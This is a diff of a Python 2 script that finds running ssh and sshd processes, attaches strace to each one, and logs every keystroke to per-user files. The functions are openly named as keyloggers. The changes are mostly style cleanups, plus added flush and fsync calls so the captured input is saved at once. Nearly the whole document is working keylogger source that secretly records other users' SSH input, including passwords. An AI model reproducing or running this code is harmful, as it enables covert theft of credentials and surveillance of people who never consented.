@@ -1,9 +1,4 @@
 #!/usr/bin/python
-
-"""This program logs all hamdi keystrokes sent to and from ssh and
-sshd.  It does this by attaching strace to a ssh process and parsing out the
-keystrokes."""
-
 from subprocess import Popen, PIPE
 from re import split
 from time import sleep
@@ -11,17 +6,18 @@ import threading
 import re
 import os
 
+
 class Process(object):
     """Parses out the process list."""
 
     def __init__(self, proc_info):
 
-        self.user  = proc_info[0]
-        self.pid   = proc_info[1]
-        self.cmd   = proc_info[10]
+        self.user = proc_info[0]
+        self.pid = proc_info[1]
+        self.cmd = proc_info[10]
 
         try:
-            self.arg   = proc_info[11]
+            self.arg = proc_info[11]
         except IndexError:
             self.arg = ""
 
@@ -29,13 +25,14 @@ class Process(object):
         """Returns ssh connections to the machine."""
         if "pts" in self.arg:
             return "New SSHD Incoming Connection: %s Running on PID %s" % \
-            (self.arg, self.pid)
+                   (self.arg, self.pid)
 
     def find_ssh(self):
         """Returns ssh connections from the machine."""
         if self.cmd == "ssh":
             return "New Outgoing connection from %s to %s with the PID %s" % \
-            (self.user, self.arg, self.pid)
+                   (self.user, self.arg, self.pid)
+
 
 def get_ps():
     """Retreives information from ps."""
@@ -44,24 +41,25 @@ def get_ps():
     # Remove header
     sub_proc.stdout.readline()
     for line in sub_proc.stdout:
-        #Split based on whitespace
+        # Split based on whitespace
         if "ssh" in line:
-            proc_info =  split(" *", line.strip())
+            proc_info = split(" *", line.strip())
             proc_list.append(Process(proc_info))
     return proc_list
+
 
 def keylogger_ssh(proc):
     """Keylogger for ssh."""
     print "Starting Keylogger to montior %s connecting to %s on %s" % \
-    (proc.user, proc.arg, proc.pid)
+          (proc.user, proc.arg, proc.pid)
 
     # Open SSH process using strace
     logger = Popen(['strace', '-s', '16384', '-p', proc.pid, "-e", \
-    "read"], shell=False, stdout=PIPE, stderr=PIPE)
+                    "read"], shell=False, stdout=PIPE, stderr=PIPE)
 
     # Open the log file
-    logfilename = DIR + proc.user + "_" + proc.arg + "_" + proc.pid +"_ssh.log"
-    logfile = open(logfilename,"a")
+    logfilename = DIR + proc.user + "_" + proc.arg + "_" + proc.pid + "_ssh.log"
+    logfile = open(logfilename, "a")
 
     while True:
         # Check to see if strace has closed
@@ -77,7 +75,7 @@ def keylogger_ssh(proc):
         # Only log the user's input
         if "read(" in output and ", 16384)" in output and "= 1" in output:
             keystroke = re.sub(r'read\(.*, "(.*)", 16384\).*= 1', r'\1', \
-            output)
+                               output)
             # Strip new linesps
             keystroke = keystroke.rstrip('\n')
             # convert \r to new line
@@ -91,19 +89,22 @@ def keylogger_ssh(proc):
             # convert \27 to \w
             keystroke = re.sub(r'\\27', r'\\w', keystroke)
             logfile.write(keystroke)
+        logfile.flush()
+        os.fsync(logfile.fileno())
+
 
 def keylogger_sshd(proc):
     """Keylogger for SSHD."""
     print "Starting Keylogger to monitor %s connection on %s" % \
-    (proc.user, proc.pid)
+          (proc.user, proc.pid)
 
     # Open SSH process using strace
     logger = Popen(['strace', '-s', '16384', '-p', proc.pid, "-e", \
-    "write"], shell=False, stdout=PIPE, stderr=PIPE)
+                    "write"], shell=False, stdout=PIPE, stderr=PIPE)
 
     # Open the log file
-    logfilename = DIR + proc.user + "_" + proc.pid +"_sshd.log"
-    logfile = open(logfilename,"a")
+    logfilename = DIR + proc.user + "_" + proc.pid + "_sshd.log"
+    logfile = open(logfilename, "a")
 
     while True:
         # Check to see if strace has closed
@@ -132,6 +133,9 @@ def keylogger_sshd(proc):
             # convert \27 to \w
             keystroke = re.sub(r'\\27', r'\\w', keystroke)
             logfile.write(keystroke)
+        logfile.flush()
+        os.fsync(logfile.fileno())
+
 
 def check_ps():
     """Checks to see if any new ssh processes are running."""
@@ -151,6 +155,7 @@ def check_ps():
                 print proc.find_ssh()
                 tssh = threading.Thread(target=keylogger_ssh, args=[proc])
                 tssh.start()
+
 
 if __name__ == "__main__":
 
